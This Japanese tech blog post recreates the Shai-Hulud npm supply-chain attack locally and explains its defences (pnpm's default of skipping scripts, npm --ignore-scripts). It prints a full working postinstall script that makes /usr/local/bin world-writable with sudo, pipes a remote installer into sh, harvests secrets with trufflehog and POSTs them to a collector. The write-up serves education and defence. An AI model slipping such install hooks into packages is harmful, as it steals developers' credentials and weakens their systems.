---
title: "Shai-Huludの内容を読んで、postinstallスクリプトを用いたシークレット情報を抜き出すコードを作成した"
emoji: "👿"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["npm","ShaiHulud","postinstall","Trufflehog"]
published: true
---
:::message alert
この記事ですが、あくまで「Shai-Hulud」サプライチェーン攻撃の内容を推測し、疑似的に再現し、なぜすでにまとめていただいている対策が有効なのかを確認するために書いています。
推測の側面が強く、実際の攻撃内容とは似ても似つかない可能性が高いので、その点はご了承ください。
また、postinstallスクリプトを悪用されることの危険性を認識してもらうのが、主目的なので記事で記載内容を実際に適用することを推奨しているものではありません。
記事に搭載しているコードについては、一応シークレットを抜き出す処理を搭載しているため、もしもに備えてtrufflehogコマンドのインストール以外は、ローカルのみで完結するようにしています。
パッケージをpublishするなどリモート経由で行えば、より実際の攻撃の再現度は高くなるかもしれません。
しかし、仮に第三者がインストールしてしまったら、意図せず攻撃を仕掛けたことになります。
なので、この記事の内容をもとにしたコードをリモートに挙げて動作確認をすることは控えていただけますと幸いです。
:::
## はじめに
数日前npmパッケージに対するマルウェア攻撃で、Shai-Huludというのが大きな話題になりました。
https://rocket-boys.co.jp/security-measures-lab/javascript-nodejs-npm-supply-chain-attack-40-packages-tampered/
https://www.bleepingcomputer.com/news/security/self-propagating-supply-chain-attack-hits-187-npm-packages/
https://codebook.machinarecord.com/threatreport/silobreaker-cyber-alert/40916/
相当怖い話で攻撃手順は色々とありますが、この記事では[こちらの記事](https://codebook.machinarecord.com/threatreport/silobreaker-cyber-alert/40992/)で書かれていた以下の点について注目します。
> 攻撃者は、npmパッケージの「package.json」ファイルに悪意ある「postinstall」スクリプトを埋め込んで侵害

書いてあることはわかるのですが、当初の私はなぜこれが攻撃につながるのかが理解できませんでした。
なので、ここでは「postinstall」スクリプトへ悪意のあるコードが記載されたnpmパッケージを作成し、それをインストールした時の挙動について確認します。
そして、上記対策になる方法を用いてインストールすると、なぜ対策となるのかについても確認します。
気になる方がいれば一緒に確認いただけますと幸いです。
## 前提条件
今回検証するコード全体は以下のリポジトリにあります。
https://github.com/maronnjapan/steal-secret-by-postinstall-demo
このコードですが、基本的に以下の条件で動作することを確認しています。
- Dev Container内でのコマンド実行
- sudoコマンドで実行する時にパスワードを入力せず実行できる状態
- WSL2からVsCodeを開き、Dev Containerを起動

Dev Containerが起動でき、sudoコマンドがパスワードなしでも実行できるなら、Macでも再現はできると思います。
ですが、動作確認をしていないことはご留意ください。
また、今回はリポジトリのtarget-appディレクトリ内にあるprivate.keyを、認証情報と仮定してそれをpostinstallスクリプト経由で取得するようにしています。（このprivate.keyは`openssl genrsa > server.key`コマンドで作ったもので、特に他で使用予定はない検証用の鍵となります。当たり前ですが、実際に使用している秘密鍵はgit管理から外す必要があります）
実際は、GitHubのトークンなどになるかと思いますが、お試しなのでprivate.keyの値が取得できれば良いとしています。
## 各ディレクトリの役割について
先ほどのリポジトリにあるsteal-private-key-library,get-info-app,target-appディレクトリはそれぞれ以下の役割を想定しています。
- steal-private-key-library：シークレットを見つけ出し、盗みだすnpmパッケージの想定
- get-info-app：上記パッケージが盗んだシークレットを受け取るアプリ
- target-app：steal-private-key-libraryパッケージをインストールするアプリ

target-appが steal-private-key-libraryという悪意のあるパッケージをインストールすることで、秘密鍵の情報が盗まれてしまうというシナリオを想定しています。
イメージは以下の形です。
![](/images/get-secret-in-postinstall/flow-steal-secret.png)
赤い側悪意のある開発者が提供したもので、青色は被害を受けるアプリを想定しています。
それでは実際に動かしてみます。
## 動かしてみる
コードを確認する前にまずは実際に動かしてみます。
なお、最初にDev Containerを起動しますが、ここでは起動するための設定などは記載しませんので、適宜別の記事を参照して、補完していただけますと幸いです。
先ほどのリポジトリをクローンしたら、以下の手順を実行します。
1. VsCode上で、Dev Containerを起動します。
2. get-info-appディレクトリに移動後、`pnpm install`を実行し、`pnpm run dev`でアプリケーションを起動してください。以下のログが出ていれば起動できています
```
サーバーが http://localhost:3000 で起動しました
POST /info エンドポイントが利用可能です
```
3. `trufflehog --version`を実行しても、コマンドが存在せず実行できないことを確認してください。
4. `ls -l /usr/local/`を実行し、binの権限がdrwxrwxrwxになっていないことを確認してください。
5. target-appディレクトリに移動後、`npm install`を実行してください。
6. installが終われば、`trufflehog --version`を実行し、trufflehogコマンドが実行できることを確認してください。
7. `ls -l /usr/local/`でbinの権限が`drwxrwxrwx`になっていることを確認してください。
8. [http://localhost:3000/secret.txt](http://localhost:3000/secret.txt)にアクセスしserver.keyの値が出力されていることを確認してください。

デモは以下の通りです。
![](/images/get-secret-in-postinstall/steal-private-key-demo.gif)
`npm install`しかしていませんが、認証情報を集めるアプリに値が反映されてしまっています。
今回は悪意のあるパッケージがインストールしているとわかっていますが、そうでない場合いつの間にかシークレットの値がやり取りされているので、中々怖い状況です。
そして、binの権限も書き込める権限がついてしまっています。
それでは次に、どうして`npm install`で値がアプリに渡されるのか、その理由をコードを見て確認します。
## コードの確認
秘密鍵を抜き取るために一番注目してほしいのが、[steal-private-key-library/install.js](https://github.com/maronnjapan/steal-secret-by-postinstall-demo/blob/main/steal-private-key-library/install.js)です。
```js
const { execSync } = require("child_process");
const fs = require("fs");

async function install() {
  try {
    // trufflehogコマンドを実行できるようにするためにbinのパーミッションを変更
    execSync("sudo chmod 777 -R /usr/local/bin");

    // trufflehogのダウンロードとパスを通す
    execSync(`curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin`);

    // trufflehogコマンドを実行して見つけたシークレットを取得
    const result = execSync(`trufflehog filesystem /workspaces/ --json | grep '"Raw":"' | grep -o '"Raw":"[^"]*"' | sed 's/"Raw":"\\(.*\\)"/\\1/' | sed 's/\\\\n/\\n/g'`, {
      shell: '/bin/bash',
      encoding: 'utf8'
    });

    await fetch("http://localhost:3000/info", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ info: result }),
    });

  } catch (error) {
    console.error("Installation failed:", error);
  }
}

install();
```
このファイルは以下のことを行っています。
- 任意のコマンドのパスを通せるように権限を設定
- [trufflehog](https://github.com/trufflesecurity/trufflehog?tab=readme-ov-file#using-installation-script)のドキュメントをもとにインストールコマンドを実行し、trufflehogコマンドのパスを通す
- trufflehogコマンドで、シークレット情報をかき集め、値を収集用アプリにリクエストする

実際の攻撃でも、trufflehogが悪用されてトークンなどをかき集めていたみたいなので、trufflehogコマンドを使うようにしています。
これだけで、認証情報が取得できてしまう可能性があります。
trufflehog自体は、認証情報が安全ではない所に存在していないかをチェックできる非常に素晴らしいパッケージです。
そのため、そのパッケージが悪用され、このような形で認証情報を取れてしまうのはかなり驚きでした。
このinstall.jsを、steal-private-key-libraryディレクトリ配下のpackage.json内のscriptに以下のように記載しています。
```json
{
    "scripts": {
        "postinstall": "node install.js"
    },
}
```
こうすることで、パッケージのインストール後に、先ほど確認したシークレットを抜き出します。
そして、抜き出したシークレットを別のシークレット収集用のアプリ（get-info-app）に送信する処理が実行されます。
以上が主要な部分のコードについてです。
今回解説したのはコードの一部ですが、他の部分は攻撃とはあまり関係ないのと、非常に簡単なことしか書いていないです。
そのため、この記事内では省略いたします。
## 対策について
以上のようなpostinstallスクリプトによって、シークレットが取られてしまうケースとそのコードは確認できました。
それでは、対策はどうすればよいのかが気になりますが、すでに以下の記事にてまとめられております。
https://zenn.dev/azu/articles/ad168118524135
上記記事はこの記事の内容だけではない事象への対策も含まれております。
その中で、postinstallスクリプトへの対策については「[依存のインストール](https://zenn.dev/azu/articles/ad168118524135#%E4%BE%9D%E5%AD%98%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB)」でまとめていただいております。
正確なことは上記記事の参照をお願いしたいのですが、とりあえずバージョンが10以上のpnpmコマンドを使えば、デフォルトでpostinstallスクリプトを実行しないです。
そのため、`pnpm install`や`pnpm add`を実行すれば今回のケースは発生しないかと思います。
以下にデモを添付します。
![](/images/get-secret-in-postinstall/not-steal-by-pnpm-demo.gif)
steal-private-key-libraryパッケージはインストールされていますが、postinstallスクリプトが実行されていないので、秘密鍵の値が書き込まれていません。
このように、pnpmコマンドを使えばデフォルトでpostinstallが実行されないので、対策となるという形です。
なお、npmでも`--ignore-scripts`オプションを使用すれば、同様にpostinstallスクリプトを実行せずにインストールできるみたいです。
npmコマンドについては、`--loglevel=silly`オプションを付けてログを出力してみたら、実際に`--ignore-scripts`オプションの時は、postinstallスクリプトが実行されていないことを確認できます。
**`--ignore-scripts`オプションありの場合**
![](/images/get-secret-in-postinstall/not-exec-post-install.png)
**`--ignore-scripts`オプションなしの場合**
![](/images/get-secret-in-postinstall/exec-post-install.png)
ただ、使い勝手を考えるとpnpmコマンドを使うほうが良い印象を参照元の記事から受けました。
## おわりに
今回はIT業界を衝撃を与えた「Shai-Hulud」の攻撃手法を読んで、postinstallスクリプトが悪用されるケースについて確認しました。
推測もりもりなので、実際の攻撃とは異なる部分もあると思いますし、もっと検知されにくい形でシークレットを送信するかと思います。
さらに、シークレットを抜き取る部分も難読化して、攻撃を行うコードだと判定しにくくさせているはずです。
このように、実際の攻撃は今回の記事のような単純な構造ではなく、マルウェアだと判断しにくいものになっているとおもいます。（また、sudoコマンドの実行を行うなど攻撃の手法とするなら強引だと感じる部分もあります）
ですが、今回のような単純な記事だからこそ、実際の攻撃の恐ろしさがより実感でき、[azuさんが投稿されているような対策方法](https://zenn.dev/azu/articles/ad168118524135)を講じる必要性を感じられると考えています。
本筋とは少しずれますが、実際この記事の内容を動かすことで、同じくazuさんが記事内で言及していた[生のTokenはローカルにおかないこと](https://zenn.dev/azu/articles/ad168118524135#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%81%AB%E7%94%9Ftoken%E3%82%92%E7%BD%AE%E3%81%8B%E3%81%AA%E3%81%84)の大切さが実感できました。
ここまで読んでいただきありがとうございます。